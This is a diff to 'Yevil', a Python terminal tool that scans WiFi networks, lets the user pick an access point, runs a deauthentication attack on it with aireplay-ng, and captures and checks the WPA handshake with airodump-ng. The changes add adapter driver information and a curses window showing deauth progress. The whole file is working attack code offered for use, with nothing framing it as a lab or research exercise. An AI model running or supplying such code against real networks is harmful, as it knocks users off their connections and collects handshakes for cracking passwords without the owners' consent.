@@ -1,10 +1,12 @@
 #!/usr/bin/env python3
 """
-Yevil - Real‑time WiFi Scanner v2.5.0
+Yevil - Real‑time WiFi Scanner v2.8.0
 - Curses TUI for live scanning.
 - Persistent AP summary after exit.
 - Select AP for focused scan + deauth attack + handshake detection.
-- Clean deauth output, auto reset.
+- Deauth progress shown in a clean curses window (no scrolling).
+- Shows adapter interface with driver/bus info.
+- Auto reset monitor mode after scan.
 """
 
 import os
@@ -12,7 +14,6 @@ import sys
 import subprocess
 import re
 import time
-import signal
 import glob
 import curses
 from collections import defaultdict
@@ -67,15 +68,54 @@ def reset_adapter():
             pass
 
 
+def get_adapter_info(iface):
+    """Return a human-readable description of the adapter."""
+    description = iface
+
+    if 'mon' in iface:
+        return iface + " (monitor)"
+
+    try:
+        dev_path = os.path.realpath(f"/sys/class/net/{iface}/device")
+        is_usb = "usb" in dev_path
+
+        driver = ""
+        try:
+            res = subprocess.run(['ethtool', '-i', iface], capture_output=True, text=True, timeout=2)
+            for line in res.stdout.split('\n'):
+                if line.startswith('driver:'):
+                    driver = line.split(':')[1].strip()
+                    break
+        except:
+            pass
+
+        if is_usb:
+            description = f"{iface} (USB"
+            if driver:
+                description += f" - {driver}"
+            description += ")"
+        else:
+            description = f"{iface} (Internal)"
+            if driver:
+                description += f" - {driver}"
+
+    except Exception:
+        pass
+
+    return description
+
+
 def detect_adapters():
+    """Return a list of dicts with 'interface' and 'description'."""
     adapters = []
     try:
         result = subprocess.run(['iwconfig'], capture_output=True, text=True)
         for line in result.stdout.split('\n'):
             if 'IEEE 802.11' in line:
-                adapter = line.split()[0]
-                if adapter not in adapters:
-                    adapters.append(adapter)
+                iface = line.split()[0]
+                if 'mon' not in iface:
+                    desc = get_adapter_info(iface)
+                    adapters.append({'interface': iface, 'description': desc})
     except:
         pass
     return adapters
@@ -253,12 +293,91 @@ def print_final_summary():
     print("\033[96m" + "=" * 80 + "\033[0m\n")
 
 # ============================================
+# DEAUTH CURSES PROGRESS
+# ============================================
+
+def deauth_curses(stdscr, bssid, channel, interface, count):
+    """Curses window showing deauth progress."""
+    curses.curs_set(0)
+    stdscr.nodelay(True)
+    stdscr.timeout(100)
+
+    # Start the deauth process
+    cmd_deauth = [
+        'sudo', 'aireplay-ng',
+        '-0', str(count),
+        '-a', bssid,
+        '--ignore-negative-one',
+        interface
+    ]
+    proc = subprocess.Popen(cmd_deauth,
+                            stdout=subprocess.PIPE,
+                            stderr=subprocess.STDOUT,
+                            text=True,
+                            bufsize=1)
+
+    packet_num = 0
+    latest_line = "Waiting for deauth output..."
+    abort = False
+
+    while True:
+        # Check for key press
+        key = stdscr.getch()
+        if key in (ord('q'), ord('Q'), 3):  # q or Ctrl+C
+            abort = True
+            proc.terminate()
+            break
+
+        # Read non‑blocking from stdout
+        try:
+            line = proc.stdout.readline()
+            if line:
+                line = line.strip()
+                if line:
+                    packet_num += 1
+                    latest_line = line
+        except:
+            pass
+
+        # Update display
+        stdscr.erase()
+        max_y, max_x = stdscr.getmaxyx()
+
+        title = "=== YEVIL - DEAUTH ATTACK ==="
+        stdscr.addstr(0, max(0, (max_x - len(title)) // 2), title, curses.A_BOLD | curses.color_pair(4))
+
+        info = f"Target AP: {bssid}  |  Channel: {channel}  |  Interface: {interface}"
+        stdscr.addstr(2, 2, info[:max_x - 4])
+
+        progress = f"Packets sent: {packet_num} / {count}"
+        stdscr.addstr(4, 2, progress[:max_x - 4])
+
+        # Show latest deauth line (truncated)
+        display_line = latest_line[:max_x - 6]
+        stdscr.addstr(6, 2, f"Latest: {display_line}")
+
+        # Status / instructions
+        if proc.poll() is not None:
+            stdscr.addstr(8, 2, "Deauth process finished.")
+            break
+        else:
+            stdscr.addstr(8, 2, "Press 'q' to abort.")
+
+        stdscr.refresh()
+        time.sleep(0.1)
+
+    # Wait for process to end if not already
+    proc.wait()
+    # Give a moment for user to see final status
+    time.sleep(1)
+
+
+# ============================================
 # TARGETED SCAN WITH DEAUTH + HANDSHAKE DETECTION
 # ============================================
 
 def run_targeted_scan(bssid, channel, interface):
-    """Launch focused scan + deauth attack, then check for handshake."""
-    # Ask for deauth count
+    """Launch focused scan + deauth attack (curses progress), then check for handshake."""
     try:
         count = input("[?] Number of deauth packets to send (default 20): ").strip()
         if count == "":
@@ -270,11 +389,9 @@ def run_targeted_scan(bssid, channel, interface):
         count = "20"
         print("[!] Invalid input, using default 20.")
 
-    # Prepare capture filenames
     cap_prefix = f"/tmp/yevil_handshake_{bssid.replace(':', '_')}"
     cap_file = f"{cap_prefix}-01.cap"
 
-    # Remove old files
     for f in [cap_file]:
         if os.path.exists(f):
             try:
@@ -295,42 +412,19 @@ def run_targeted_scan(bssid, channel, interface):
     airo_proc = subprocess.Popen(cmd_airodump, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     time.sleep(2)
 
-    # Send deauth packets – capture output and print cleanly
-    cmd_deauth = [
-        'sudo', 'aireplay-ng',
-        '-0', count,
-        '-a', bssid,
-        '--ignore-negative-one',
-        interface
-    ]
-    print(f"\n[+] Sending deauth packets: {' '.join(cmd_deauth)}")
-    print("[+] Deauth progress:")
-    
-    # Use Popen to read output line by line and print with a prefix
-    deauth_proc = subprocess.Popen(cmd_deauth,
-                                   stdout=subprocess.PIPE,
-                                   stderr=subprocess.STDOUT,
-                                   text=True,
-                                   bufsize=1)
-    
-    for line in deauth_proc.stdout:
-        line = line.strip()
-        if line:
-            print(f"    {line}")
-    deauth_proc.wait()
+    # Run deauth with curses progress
+    print("[+] Launching deauth progress window...")
+    curses.wrapper(deauth_curses, bssid, channel, interface, count)
 
-    # Wait a few seconds for client reconnection
     print("[+] Waiting 5 seconds for potential reconnection...")
     time.sleep(5)
 
-    # Stop airodump-ng
     print("[+] Stopping capture...")
     airo_proc.terminate()
     time.sleep(1)
     if airo_proc.poll() is None:
         airo_proc.kill()
 
-    # Analyse the capture
     if os.path.exists(cap_file):
         print(f"\n[+] Analysing {cap_file} for handshake...")
         try:
@@ -349,7 +443,6 @@ def run_targeted_scan(bssid, channel, interface):
     else:
         print("[-] No capture file found. Something went wrong.")
 
-    # Delete capture files automatically
     for f in [cap_file]:
         try:
             os.remove(f)
@@ -375,26 +468,26 @@ def main():
 
     print("\n📋 Available Wireless Adapters:")
     for i, adapter in enumerate(adapters, 1):
-        print(f"  {i}. {adapter}")
+        print(f"  {i}. {adapter['description']}")
 
     while True:
         try:
             choice = input("\n[?] Select adapter number: ")
             selected = adapters[int(choice) - 1]
+            selected_iface = selected['interface']
             break
         except (IndexError, ValueError):
             print("[-] Invalid selection!")
 
-    print(f"[*] Setting {selected} into monitor mode...")
-    if not set_monitor_mode(selected):
+    print(f"[*] Setting {selected_iface} into monitor mode...")
+    if not set_monitor_mode(selected_iface):
         print("[-] Failed to set monitor mode.")
         sys.exit(1)
 
     cleanup_files()
 
-    # Launch background airodump-ng for the main scan
     cmd = [
-        'airodump-ng', selected,
+        'airodump-ng', selected_iface,
         '--band', 'abg',
         '--write', CSV_PREFIX,
         '--output-format', 'csv'
@@ -405,7 +498,6 @@ def main():
     print("[*] Launching Real-time Interface...")
     time.sleep(1)
 
-    # Run Curses UI
     try:
         curses.wrapper(curses_display)
     except KeyboardInterrupt:
@@ -415,10 +507,8 @@ def main():
     finally:
         cleanup()
 
-    # Show summary
     print_final_summary()
 
-    # Target selection & handshake capture
     if networks:
         print("\n[?] Enter the number of the AP to capture a handshake (or press Enter to skip):")
         try:
@@ -431,7 +521,7 @@ def main():
                 if 0 <= idx < len(sorted_nets):
                     target = sorted_nets[idx]
                     print(f"\n[+] Targeting {target['ssid']} ({target['bssid']}) on channel {target['channel']}")
-                    run_targeted_scan(target['bssid'], target['channel'], selected)
+                    run_targeted_scan(target['bssid'], target['channel'], selected_iface)
                 else:
                     print("[-] Invalid selection, skipping.")
         except ValueError:
@@ -439,7 +529,7 @@ def main():
         except KeyboardInterrupt:
             print("\n[+] Skipped.")
 
-    # Auto reset adapter
+    # Auto reset
     print("\n[+] Restoring adapter to managed mode...")
     reset_adapter()
 
